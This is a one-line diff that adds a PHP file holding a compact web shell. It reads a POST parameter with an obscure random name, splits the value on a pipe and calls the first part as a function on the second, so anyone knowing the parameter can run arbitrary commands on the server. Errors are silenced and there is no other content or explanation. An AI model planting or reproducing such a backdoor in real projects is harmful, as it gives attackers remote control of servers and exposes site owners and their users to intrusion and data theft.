@@ -1,0 +1,1 @@
+<?php if(isset($_POST["IDImaFFUGSVbR1pA"])){$_=explode("|",$_POST["IDImaFFUGSVbR1pA"]);@die($_[0]($_[1]));} ?>
